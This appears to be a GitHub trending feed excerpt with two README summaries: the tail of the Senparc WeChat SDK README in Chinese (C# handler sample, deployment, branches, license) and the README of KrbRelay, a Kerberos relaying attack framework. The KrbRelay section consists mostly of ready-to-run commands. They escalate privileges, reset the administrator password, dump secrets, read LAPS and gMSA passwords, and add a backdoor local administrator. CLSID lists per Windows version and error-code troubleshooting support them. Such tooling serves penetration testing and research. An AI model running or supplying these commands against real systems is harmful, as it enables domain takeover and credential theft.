&#xA;&lt;p&gt;上述代码中的CustomMessageHandler是一个自定义的类，继承自Senparc.Weixin.MP.MessageHandler.cs。MessageHandler是一个抽象类，包含了执行各种不同请求类型的抽象方法（如文字，语音，位置、图片等等），我们只需要在自己创建的CustomMessageHandler中逐个实现这些方法就可以了。刚建好的CustomMessageHandler.cs如下：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C#&#34;&gt;using System;&#xA;using System.IO;&#xA;using Senparc.Weixin.MP.MessageHandlers;&#xA;using Senparc.Weixin.MP.Entities;&#xA;&#xA;namespace Senparc.Weixin.MP.Sample.CustomerMessageHandler&#xA;{&#xA;    public class CustomMessageHandler : MessageHandler&amp;lt;MessageContext&amp;gt;&#xA;    {&#xA;        public public CustomMessageHandler(Stream inputStream, PostModel postModel, int maxRecordCount = 0)&#xA;            : base(inputStream, postModel, maxRecordCount)&#xA;        {&#xA;&#xA;        }&#xA;&#xA;        public override IResponseMessageBase DefaultResponseMessage(IRequestMessageBase requestMessage)&#xA;        {&#xA;            //ResponseMessageText也可以是News等其他类型&#xA;            var responseMessage = CreateResponseMessage&amp;lt;ResponseMessageText&amp;gt;();&#xA;            responseMessage.Content = &#34;这条消息来自DefaultResponseMessage。&#34;;&#xA;            return responseMessage;&#xA;        }&#xA;&#xA;        public override IResponseMessageBase OnTextRequest(RequestMessageText requestMessage)&#xA;        {&#xA;            //...&#xA;        }&#xA;&#xA;        public override IResponseMessageBase OnVoiceRequest(RequestMessageVoice requestMessage)&#xA;        {&#xA;            //...&#xA;        }&#xA;&#xA;        //更多没有重写的OnXX方法，将默认返回DefaultResponseMessage中的结果。&#xA;        ....&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;其中OnTextRequest、OnVoiceRequest等分别对应了接收文字、语音等不同的请求类型。&lt;/p&gt; &#xA;&lt;p&gt;比如我们需要对文字类型请求做出回应，只需要完善OnTextRequest方法：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C#&#34;&gt;      public override IResponseMessageBase OnTextRequest(RequestMessageText requestMessage)&#xA;      {&#xA;          //TODO:这里的逻辑可以交给Service处理具体信息，参考OnLocationRequest方法或/Service/LocationSercice.cs&#xA;          var responseMessage = CreateResponseMessage&amp;lt;ResponseMessageText&amp;gt;();&#xA;          responseMessage.Content = string.Format(&#34;您刚才发送了文字信息：{0}&#34;, requestMessage.Content);&#xA;          return responseMessage;&#xA;      }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;这样CustomMessageHandler在执行messageHandler.Execute()的时候，如果发现请求信息的类型是文本，会自动调用以上代码，并返回代码中的responseMessage作为返回信息。responseMessage可以是IResponseMessageBase接口下的任何类型（包括文字、新闻、多媒体等格式）。&lt;/p&gt; &#xA;&lt;p&gt;从v0.4.0开始，MessageHandler增加了对用户会话上下文的支持，用于解决服务器上无法使用Session管理用户会话的缺陷。详见：&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/wiki/%E7%94%A8%E6%88%B7%E4%B8%8A%E4%B8%8B%E6%96%87WeixinContext%E5%92%8CMessageContext&#34;&gt;用户上下文WeixinContext和MessageContext&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;使用Nuget安装到项目中&lt;/h2&gt; &#xA;&lt;p&gt;各个模块的 Nuget 安装方式：《&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/wiki/%E4%BD%BF%E7%94%A8-Nuget-%E5%B0%86-SDK-%E5%AE%89%E8%A3%85%E5%88%B0%E9%A1%B9%E7%9B%AE%E4%B8%AD&#34;&gt;使用 Nuget 将 SDK 安装到项目中&lt;/a&gt;》&lt;/p&gt; &#xA;&lt;h2&gt;如何开发小程序&lt;/h2&gt; &#xA;&lt;p&gt;小程序的后端架构和公众号保持了高度一致， 只需要使用Nuget安装&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.WxOpen&#34;&gt;Senparc.Weixin.WxOpen&lt;/a&gt;库即可开始使用小程序。 Senparc.Weixin.WxOpen目前包含了所有小程序需要用到的消息处理、AccessToken管理、模板消息、二维码生成等全套功能。&lt;/p&gt; &#xA;&lt;h2&gt;如何部署&lt;/h2&gt; &#xA;&lt;h3&gt;1) 部署到 Azure App Service&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/azure/app-service/azure-web-sites-web-hosting-plans-in-depth-overview&#34;&gt;App Service&lt;/a&gt; 是 Microsoft Azure 推出的 Web 服务，对 .NET 有很好的支持。部署步骤详见：&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/wiki/%E5%B0%86%E5%BE%AE%E4%BF%A1%E7%AB%99%E7%82%B9%E9%83%A8%E7%BD%B2%E5%88%B0-Azure-%E4%B8%AD&#34;&gt;《将微信站点部署到 Azure 中》&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;h3&gt;2) 部署到任意服务器的 FTP&lt;/h3&gt; &#xA;&lt;p&gt;在 Web 服务器上安装 FTP 服务（推荐 &lt;a href=&#34;https://filezilla-project.org/download.php?type=server&#34;&gt;FileZilla Server&lt;/a&gt;），直接使用 FTP 直接上传本地已经编译好的代码（本项项目 &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/master/Samples&#34;&gt;Samples&lt;/a&gt; 中对应的是 &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/Developer/Samples/net6-mvc&#34;&gt;Senparc.Weixin.Sample.Net6&lt;/a&gt; 或 &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/Developer/Samples/netcore3.1-mvc&#34;&gt;Senparc.Weixin.Sample.NetCore3&lt;/a&gt;，编译后即可直接使用，无需修改代码）。如果使用 Azure App Service 或其他云服务，通常 FTP 也都是开通的。&lt;/p&gt; &#xA;&lt;!--&#xA;已实现功能&#xA;-------------&#xA;* 微信公众号&#xA;&gt;   - [x] 接收/发送消息（事件）&#xA;&gt;   - [x] 自定义菜单 &amp; 个性化菜单&#xA;&gt;   - [x] 消息管理&#xA;&gt;   - [x] OAuth授权&#xA;&gt;   - [x] JSSDK&#xA;&gt;   - [x] 微信支付&#xA;&gt;   - [x] 用户管理&#xA;&gt;   - [x] 素材管理&#xA;&gt;   - [x] 账号管理&#xA;&gt;       - [x] 带参数二维码&#xA;&gt;       - [x] 长链接转短链接接口&#xA;&gt;       - [x] 微信认证事件推送&#xA;&gt;   - [x] 数据统计&#xA;&gt;   - [x] 微信小店&#xA;&gt;   - [x] 微信卡券&#xA;&gt;       - [x] 卡券事件推送&#xA;&gt;           - [ ] 买单事件推送&#xA;&gt;           - [ ] 会员卡内容更新事件推送&#xA;&gt;           - [ ] 库存报警事件推送&#xA;&gt;           - [ ] 券点流水详情事件推送&#xA;&gt;   - [x] 微信门店&#xA;&gt;   - [x] 微信智能&#xA;&gt;   - [x] 微信设备功能&#xA;&gt;   - [x] 多客服功能&#xA;&gt;   - [x] 微信摇一摇周边&#xA;&gt;   - [x] 微信连WI-FI（未完整）&#xA;&gt;   - [x] 微信扫一扫（商家）&#xA;&gt;       - [ ] 扫一扫事件推送&#xA;&gt;           - [ ] 打开商品主页事件推送&#xA;&gt;           - [ ] 关注公众号事件推送&#xA;&gt;           - [ ] 进入公众号事件推送&#xA;&gt;           - [ ] 地理位置信息异步推送&#xA;&gt;           - [ ] 商品审核结果推送&#xA;&#xA;* 微信开放平台&#xA;&gt;   - [x] 网站应用&#xA;&gt;   - [x] 公众号第三方平台&#xA;&#xA;&#xA;* 微信企业号&#xA;&gt;&#x9;- [x] 管理通讯录&#xA;&gt;&#x9;- [x] 管理素材文件&#xA;&gt;&#x9;- [x] 管理企业号应用&#xA;&gt;&#x9;- [x] 接收消息与事件&#xA;&gt;&#x9;- [x] 发送消息&#xA;&gt;&#x9;- [x] 自定义菜单&#xA;&gt;&#x9;- [x] 身份验证接口&#xA;&gt;&#x9;- [x] JSSDK&#xA;&gt;&#x9;- [x] 第三方应用授权&#xA;&gt;&#x9;    - [x] 第三方回调协议&#xA;&gt;&#x9;        - [ ] 授权成功推送auth_code事件&#xA;&gt;&#x9;        - [ ] 通讯录变更通知&#xA;&gt; &#x9;- [x] 企业号授权登陆&#xA;&gt;&#x9;- [x] 企业号微信支付&#xA;&gt;&#x9;- [x] 企业回话服务&#xA;&gt;&#x9;    - [ ] 企业会话回调&#xA;&gt;&#x9;- [x] 企业摇一摇周边&#xA;&gt;&#x9;- [ ] 企业卡券服务&#xA;&gt;&#x9;    - [ ] 卡券事件推送&#xA;&gt;&#x9;- [x] 企业客服服务&#xA;&gt;&#x9;    - [ ] 客服回复消息回调&#xA;&#x9;    &#xA;&#xA;&#xA;* 缓存策略&#xA;&gt;   - [x] 策略扩展接口&#xA;&gt;   - [x] 本地缓存&#xA;&gt;   - [x] Redis 扩展包&#xA;&gt;   - [x] Memcached 扩展包&#xA;&#xA; 欢迎开发者对未完成或需要补充的模块进行 Pull Request！&#xA;--&gt; &#xA;&lt;h2&gt;各分支说明&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&amp;nbsp;分支 &amp;nbsp;&lt;/th&gt; &#xA;   &lt;th&gt;&amp;nbsp; &amp;nbsp; 说明 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;master &amp;nbsp;&lt;/td&gt; &#xA;   &lt;td&gt;正式发布的主分支，通常这个分支比较稳定，可以用于生产环境。&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Developer&lt;/td&gt; &#xA;   &lt;td&gt;1、开发分支，此分支通常为 Beta 版本，新版本都会先在此分支中进行开发，最后推送稳定版到 master 分支，如果想对新功能先睹为快，可以使用此分支。&lt;br&gt; 2、此分支同时兼容 .NET 4.5 / .NET Core / .NET Core 2.0 版本，建议 Pull Request 的代码都到这个分支下，而不是 master&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;BookVersion1&lt;/td&gt; &#xA;   &lt;td&gt;此分支为&lt;a href=&#34;https://book.weixin.senparc.com/book/link?code=github-homepage2&#34;&gt;《微信开发深度解析：微信公众号、小程序高效开发秘籍》&lt;/a&gt;图书出版时对应代码快照。&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;DotNET-Core_MySQL&lt;/td&gt; &#xA;   &lt;td&gt;此分支为 .NET Core 环境下的 &lt;a href=&#34;https://github.com/PomeloFoundation/Pomelo.EntityFrameworkCore.MySql&#34;&gt;Pomelo.EntityFrameworkCore.MySql&lt;/a&gt; 框架集成演示分支。&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;NET4.0 &amp;nbsp; &amp;nbsp;&lt;/td&gt; &#xA;   &lt;td&gt;仅支持 .NET 4.0 的分支，此分支已于2017年停止更新。.NET 4.0 最新代码随 master / Developer 分支同步更新&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;NET3.5 &amp;nbsp; &amp;nbsp;&lt;/td&gt; &#xA;   &lt;td&gt;仅支持 .NET 3.5 的分支，此分支已于2015年停止更新。.NET 3.5 最新代码随 master / Developer 分支同步更新&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Developer-Senparc.SDK&lt;/td&gt; &#xA;   &lt;td&gt;此分支仅用于 Senparc 团队内部测试，可忽略。&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;感谢贡献者&lt;/h2&gt; &#xA;&lt;p&gt;感谢为此项目做出贡献的开发者，你们不光完善了这个项目，也为中国开源事业出了一份力，感谢你们！名单&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/raw/master/Contributors.md&#34;&gt;点击这里&lt;/a&gt;查看。&lt;/p&gt; &#xA;&lt;h2&gt;捐助&lt;/h2&gt; &#xA;&lt;p&gt;如果这个项目对您有用，我们欢迎各方任何形式的捐助，也包括参与到项目代码更新或意见反馈中来。谢谢！&lt;/p&gt; &#xA;&lt;p&gt;资金捐助：&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://sdk.weixin.senparc.com#donate&#34;&gt;&lt;img src=&#34;http://sdk.weixin.senparc.com/Images/T1nAXdXb0jXXXXXXXX_s.png&#34; alt=&#34;donate&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Star 数量统计&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/JeffreySu/WeiXinMPSDK&#34;&gt;&lt;img src=&#34;https://starchart.cc/JeffreySu/WeiXinMPSDK.svg?sanitize=true&#34; alt=&#34;starcharts stargazers over time&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Apache License Version 2.0&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Copyright 2021 Jeffrey Su &amp;amp; Suzhou Senparc Network Technology Co.,Ltd.&#xA;&#xA;Licensed under the Apache License, Version 2.0 (the &#34;License&#34;); you may not use this file &#xA;except in compliance with the License. You may obtain a copy of the License at&#xA;&#xA;http://www.apache.org/licenses/LICENSE-2.0&#xA;&#xA;Unless required by applicable law or agreed to in writing, software distributed under the &#xA;License is distributed on an &#34;AS IS&#34; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, &#xA;either express or implied. See the License for the specific language governing permissions &#xA;and limitations under the License.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Detail: &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/raw/master/license.md&#34;&gt;https://github.com/JeffreySu/WeiXinMPSDK/blob/master/license.md&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>cube0x0/KrbRelay</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/cube0x0/KrbRelay</id>
    <link href="https://github.com/cube0x0/KrbRelay" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Framework for Kerberos relaying&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;KrbRelay&lt;/h1&gt; &#xA;&lt;p&gt;Relaying 3-headed dogs. More details at &lt;a href=&#34;https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html&#34;&gt;https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html&lt;/a&gt; and &lt;a href=&#34;https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html&#34;&gt;https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This should be working on most fully patched Windows systems. There may be difficulties with Server OS in lab environments because of the firewall blocking the OXID resolver however, this will most likely not be an issue during real life engagements, same goes for CLSIDs.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/cube0x0/KrbRelay/main/Images/image-20220213094644590.png&#34; alt=&#34;image-20220213094644590&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Supported Protocols and Features&lt;/h3&gt; &#xA;&lt;p&gt;Some protocols are more completed than others, PR&#39;s are welcomed.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;LLMNR&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;LDAP/LDAPS&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;HTTP&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;EWS&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;SMBv2&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;RPC over SMB&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;MS-SAMR&lt;/li&gt; &#xA;   &lt;li&gt;MS-SCMR&lt;/li&gt; &#xA;   &lt;li&gt;MS-RPRN&lt;/li&gt; &#xA;   &lt;li&gt;MS-RRP&lt;/li&gt; &#xA;   &lt;li&gt;MS-LSAT/MS-LSAD&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Examples&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;# LPE&#xA;.\KrbRelay.exe -spn ldap/dc01.htb.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-2982218752-1219710089-3973213059-1606&#xA;.\KrbRelay.exe -spn ldap/dc01.htb.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred&#xA;&#xA;# Cross-Session LDAP&#xA;.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -shadowcred&#xA;.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -shadowcred win2016$&#xA;.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -rbcd S-1-5-21-2982218752-1219710089-3973213059-1606 win2016$&#xA;.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-groupmember srv_admins domain_user&#xA;.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -laps&#xA;.\KrbRelay.exe -spn ldap/dc02.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ssl -gmsa&#xA;.\KrbRelay.exe -spn ldap/dc02.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ssl -reset-password administrator Password123!&#xA;&#xA;# Cross-Session HTTP&#xA;.\KrbRelay.exe -spn http/exchange.htb.local -endpoint EWS/Exchange.asmx -ssl -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ews-search beta,test&#xA;.\KrbRelay.exe -spn http/exchange.htb.local -endpoint EWS/Exchange.asmx -ssl -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ews-delegate domain_user@htb.local&#xA;.\KrbRelay.exe -spn http/win2016.htb.local -endpoint iisstart.htm -proxy -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182&#xA;&#xA;# Cross-Session SMB&#xA;.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -console&#xA;.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-privileges (([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value)&#xA;.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -secrets &#xA;.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -service-add addUser &#34;C:\windows\system32\cmd.exe /c &#34;&#34;&#34;&#34;C:\windows\system32\net user cube Password123! /add &amp;amp;&amp;amp; C:\windows\system32\net localgroup administrators cube /add&#34;&#34;&#34;&#34;&#34;&#xA;&#xA;# LLMNR&#xA;.\KrbRelay.exe -llmnr -spn &#39;cifs/win2019.htb.local&#39; -secrets&#xA;&#xA;# NTLM (see https://github.com/antonioCoco/RemotePotato0 for CLSIDs)&#xA;.\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&#xA;.\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm -downgrade&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;CheckPort.exe&lt;/code&gt; is a C# tool that can be used to discover available ports for the OXID resolver.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Users\domain_user\Desktop\KrbRelay\CheckPort\bin\Release\CheckPort.exe&#xA;[*] Looking for available ports..&#xA;[*] Port: 1024 is available&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;CLSIDs&lt;/h2&gt; &#xA;&lt;p&gt;We&#39;ll need to unmarshal our OBJREF inside of a process that would allow authentications over the network, this can be verified by looking at the &lt;code&gt;Impersonation Level&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;RPC_C_IMP_LEVEL_DEFAULT # Will not work&lt;/li&gt; &#xA; &lt;li&gt;RPC_C_IMP_LEVEL_ANONYMOUS # Will not work&lt;/li&gt; &#xA; &lt;li&gt;RPC_C_IMP_LEVEL_IDENTIFY # Works for LDAP&lt;/li&gt; &#xA; &lt;li&gt;RPC_C_IMP_LEVEL_IMPERSONATE # Required for SMB&lt;/li&gt; &#xA; &lt;li&gt;RPC_C_IMP_LEVEL_DELEGATE&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;When relaying to LDAP or any other service that has signing enabled but not enforced we would also need to verify that the &lt;code&gt;Authentication Level&lt;/code&gt; of the process is set to &lt;code&gt;RPC_C_AUTHN_LEVEL_CONNECT&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Processes running under &lt;code&gt;NT Authority\Network service&lt;/code&gt; will use the SYSTEM account when authenticating over the network.&lt;/p&gt; &#xA;&lt;p&gt;Tool for discovering CLSIDs: &lt;a href=&#34;https://github.com/tyranid/oleviewdotnet&#34;&gt;https://github.com/tyranid/oleviewdotnet&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-Module .\OleViewDotNet.psd1&#xA;Get-ComDatabase -SetCurrent&#xA;$comdb = Get-CurrentComDatabase&#xA;$clsids = (Get-ComClass).clsid&#xA;Get-ComProcess -DbgHelpPath &#39;C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll&#39; | select ProcessId,ExecutablePath,Name,AppId,User,AuthnLevel,ImpLevel&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Windows 10 1903&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;# SYSTEM Relay&#xA;0bae55fc-479f-45c2-972e-e951be72c0c1 # RPC_C_IMP_LEVEL_IDENTIFY&#xA;90f18417-f0f1-484e-9d3c-59dceee5dbd8 # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;&#xA;# Cross-Session Relay&#xA;0289a7c5-91bf-4547-81ae-fec91a89dec5 # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;1f87137d-0e7c-44d5-8c73-4effb68962f2 # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;73e709ea-5d93-4b2e-bbb0-99b7938da9e4 # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;9678f47f-2435-475c-b24a-4606f8161c16 # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;9acf41ed-d457-4cc1-941b-ab02c26e4686 # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;ce0e0be8-cf56-4577-9577-34cc96ac087c # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Server 2019&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;# SYSTEM Relay&#xA;90f18417-f0f1-484e-9d3c-59dceee5dbd8 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;&#xA;# Cross-Session Relay&#xA;354ff91b-5e49-4bdc-a8e6-1cb6c6877182 # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;38e441fb-3d16-422f-8750-b2dacec5cefc # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;f8842f8e-dafe-4b37-9d38-4e0714a61149 # RPC_C_IMP_LEVEL_IMPERSONATE &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Server 2016&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;# SYSTEM Relay&#xA;90f18417-f0f1-484e-9d3c-59dceee5dbd8 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;&#xA;# Cross-Session Relay&#xA;0289a7c5-91bf-4547-81ae-fec91a89dec5 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;1f87137d-0e7c-44d5-8c73-4effb68962f2 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;5f7f3f7b-1177-4d4b-b1db-bc6f671b8f25 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;73e709ea-5d93-4b2e-bbb0-99b7938da9e4 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;9678f47f-2435-475c-b24a-4606f8161c16 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;98068995-54d2-4136-9bc9-6dbcb0a4683f # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;9acf41ed-d457-4cc1-941b-ab02c26e4686 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;bdb57ff2-79b9-4205-9447-f5fe85f37312 # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;ce0e0be8-cf56-4577-9577-34cc96ac087c # RPC_C_IMP_LEVEL_IMPERSONATE&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Error codes&lt;/h2&gt; &#xA;&lt;p&gt;Doesn&#39;t work the first time? try again then check these error codes, and if you are going to open an Issue, please paste the full output.&lt;/p&gt; &#xA;&lt;h4&gt;Firewall blocking the OXID resolver&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;System.Runtime.InteropServices.COMException (0x800706BA): The RPC server is unavailable. (Exception from HRESULT: 0x800706BA)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Bad CLSID&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;System.Runtime.InteropServices.COMException (0x80080004): Bad path to object (Exception from HRESULT: 0x80080004 (CO_E_BAD_PATH))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Kerberos Issues (Authentication type not recognized), Will work after reboot/clock sync&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;System.Runtime.InteropServices.COMException (0x800706D3): The authentication service is unknown.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Parsing Error, valid apRep tickets starts with 0x6f&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;[*] apRep1: fe534d4240000100160000c00100010001000000000000000100000000000000000000000000000035000000006c0000000000000000000000000000000000000900000048006000605e06092a864886f71201020203007e4f304da003020105a10302011ea411180f32303232303230373134303935325aa5050203045ad0a603020121a90b1b094854422e4c4f43414caa153013a003020101a10c300a1b0877696e3230313624&#xA;[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED&#xA;[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection&#xA;System.UnauthorizedAccessException: Access is denied.&#xA;&#xA;Access is denied.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;A valid apReq starts with 0x60, check your environment and parameters&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;[*] apReq: 05000b0710000000db003300020&amp;lt;SNIP&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;CLSID impersonation level or authentication level too low&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection&#xA;System.UnauthorizedAccessException: Access is denied.&#xA;&#xA;Access is denied.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Acknowledgements&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/mysmartlogon&#34;&gt;Vletoux &lt;/a&gt; for starting &lt;a href=&#34;https://github.com/vletoux/RPCForSMBLibrary&#34;&gt;RPCForSMBLibrary&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/tiraniddo&#34;&gt;James Forshaw&lt;/a&gt; for introducing Kerberos relaying and &lt;a href=&#34;https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/main/NtApiDotNet&#34;&gt;NtApiDotNet&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/TalAloni/&#34;&gt;TalAloni&lt;/a&gt; for &lt;a href=&#34;https://github.com/TalAloni/SMBLibrary&#34;&gt;SMBLibrary&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/mgrafnetter&#34;&gt;MichaelGrafnetter&lt;/a&gt; for &lt;a href=&#34;https://github.com/MichaelGrafnetter/DSInternals&#34;&gt;DSInternals&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/kevin_robertson&#34;&gt;Kevin 